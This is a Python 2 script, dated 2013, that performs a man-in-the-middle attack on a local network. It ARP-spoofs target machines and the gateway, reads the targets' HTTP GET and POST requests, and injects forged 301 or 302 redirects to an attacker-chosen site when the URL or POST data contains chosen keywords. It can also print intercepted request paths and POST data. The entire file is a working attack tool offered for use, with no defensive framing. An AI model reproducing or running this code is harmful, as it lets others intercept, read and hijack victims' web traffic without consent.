#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# Programer v sendviču
# copyright ¢ 2013 by Domen Ipavec

# my packages
from ethernet.arpspoof import ARPSpoof
import ethernet.connection as ec
import ethernet.httpredirect as httpredirect
from ethernet.ipv4 import *
from ethernet.tcp import TCP
from ethernet.httprequest import HTTPRequest
from printformat import *

# dependencies
from netaddr import EUI, IPAddress
import tld

# base python
import sys, threading, copy, Queue, os, argparse
from sets import Set
from urllib import quote, quote_plus

# parse arguments
parser = argparse.ArgumentParser(description='Perform man-in-the-middle attack.')
parser.add_argument('redirect', help='Site to redirect to (e.g. http://www.nil.si).')
parser.add_argument('keyword', help='Keyword(s) to trigger redirect.', nargs='+')
parser.add_argument('--no-redirect', '-n', help='Do not redirect when request on these hosts (note this will override default of target and google-analytics.com).', nargs='*')
parser.add_argument('--target', '-t', help='Target ip addresses (default is whole network except gateway).', nargs='*', type=IPAddress)
parser.add_argument('--interface', '-i', help='Network interface on which to perform attack (defualt: eth0)', default='eth0')
parser.add_argument('--permanent', '-p', help='Do a permanent (301) redirect instead of temporary (302)', action='store_true')
parser.add_argument('--no-ip-forward', '-f', help='Do not use "/proc/sys/net/ipv4/ip_forward" for packet forwarding.', action='store_false', dest='ip_forward')
parser.add_argument('--verbose', '-v', help='A lot of stuff printed.', action='store_true')
parser.add_argument('--requests', '-r', help='Print all detected http requests.', action='store_true')
args = parser.parse_args()

# default nonredirect_hosts are google-analytics.com and top level domain of redirect url
if args.no_redirect == None:
	nonredirect_hosts = [tld.get_tld(args.redirect), 'google-analytics.com']
else:
	nonredirect_hosts = args.no_redirect

# this ensures we get spaces in keywords as %20, + and ' '
redirect_keywords = []
for keyword in args.keyword:
	k1 = quote(keyword)
	k2 = quote_plus(keyword)
	redirect_keywords.extend(Set((k1,k2,keyword)))	

if args.permanent:
	redirect_string = httpredirect.permanent(args.redirect)
else:
	redirect_string = httpredirect.temporary(args.redirect)

# init arp spoof
arpspoof = ARPSpoof(args.interface)

# make a set of ips for fast checking
# default are all ips in network except gateway
if args.target == None:
	target_ips = Set(arpspoof.original_data.keys())
	target_ips.remove(arpspoof.ip_addresses['gateway'])
else:
	target_ips = Set(args.target)

gateway_ip = arpspoof.ip_addresses['gateway']
gateway_mac = arpspoof.original_data[gateway_ip]

if args.verbose:
	print "Non redirect hosts:", fancy_list(nonredirect_hosts)
	print "Redirect keywords:", fancy_list(redirect_keywords)
	print "Gateway:", gateway_ip, gateway_mac

target_macs = Set()
for target_ip in target_ips:
	mac = arpspoof.original_data[target_ip]
	# set mac of gateway on target to this computer
	arpspoof.addSpoof(mac, gateway_ip, arpspoof.mac_addresses['addr'])
	# set mac of target on gateway to this computer
	arpspoof.addSpoof(gateway_mac, target_ip, arpspoof.mac_addresses['addr'])
	# add mac to set for fast checking
	target_macs.add(mac)

def worker():
	# init connection
	npackets = total_size = 0
	connection = ec.EthernetConnection(gateway_mac, ec.ETHERTYPE_IPv4, arpspoof.interface)
	
	while 1:
		ethernet_packet = connection.receive()
		
		if args.verbose:
			# print number and size of processed packets every 1000 packets
			npackets+=1
			total_size += len(ethernet_packet[3]) + 14
			if npackets % 1000 == 0:
				print "Processed packets:", npackets, "(%s)" % byte_size(total_size)
		
		# process packets from targeted computers
		if ethernet_packet[1] in target_macs:
			ip_packet = IPv4(ethernet_packet[3])
			if ip_packet.protocol == PROTOCOL_TCP:
				tcp_packet = TCP(ip_packet.data)
				
				# only non-zero size tcp packets
				if len(tcp_packet.data) > 0:
					http_request = HTTPRequest(tcp_packet.data)
					
					# http post or get requests
					if http_request.command != None and http_request.command.lower() in ['post', 'get']:
						# do not redirect by default
						redirect = False
						
						# get request path (e.g. /index.php) and post variables
						http_request_path = http_request.path.lower()
						http_request_post = str(http_request.parsePOST()).lower()
						if args.requests:
							print http_request_path, http_request_post
						
						# redirect if any of keywords in request path or post data
						for keyword in redirect_keywords:
							if keyword in http_request_path or keyword in http_request_post:
								redirect = True
								break
						
						# do not redirect if any nonredirect_hosts in host
						if redirect and 'host' in http_request.headers:
							for host in nonredirect_hosts:
								if host in http_request.headers['host'].lower():
									redirect = False
									break
								
						if redirect:
							if args.verbose:
								print "Redirecting. Request by: %s. Url: %s. Post: %s" % (ip_packet.sourceIP, http_request_path, http_request_post)
							# construct and send reply with http redirect string
							tcp_reply = tcp_packet.reply(redirect_string)
							ip_reply = ip_packet.reply('')
							ip_reply.data = tcp_reply.binary(ip_reply)
							connection.send(ip_reply, ethernet_packet[1])
							# do not forward packet
							continue
			# forward packet if needed
			if not args.ip_forward:
				connection.send(ethernet_packet[3])
		# forward packets from gateway if needed
		elif not args.ip_forward and ethernet_packet[1] == gateway_mac:
			ip_packet = IPv4(ethernet_packet[3])
			if ip_packet.destinationIP in target_ips:
				connection.send(ethernet_packet[3], arpspoof.original_data[ip_packet.destinationIP])

# create worker thread
workerThread = threading.Thread(target=worker)
workerThread.daemon = True

raw_input("Press enter to start attack on '%s'." % fancy_list(target_ips))

# read and store ip_forward
f = open("/proc/sys/net/ipv4/ip_forward", "r")
previous_ip_forward = f.read()
f.close
if args.verbose:
	print "Previous value of 'ip_forward':", previous_ip_forward

# write new ip_forward
f = open("/proc/sys/net/ipv4/ip_forward", "w")
if args.ip_forward:
	f.write("1")
else:
	f.write("0")
f.close()

# start spoofing and worker
arpspoof.start()
workerThread.start()

raw_input("Press enter to stop the attack.\n")
print "Stopping..."

# write old ip_forward
f = open("/proc/sys/net/ipv4/ip_forward", "w")
f.write(previous_ip_forward)
f.close()

# stop spoofing
arpspoof.stop()
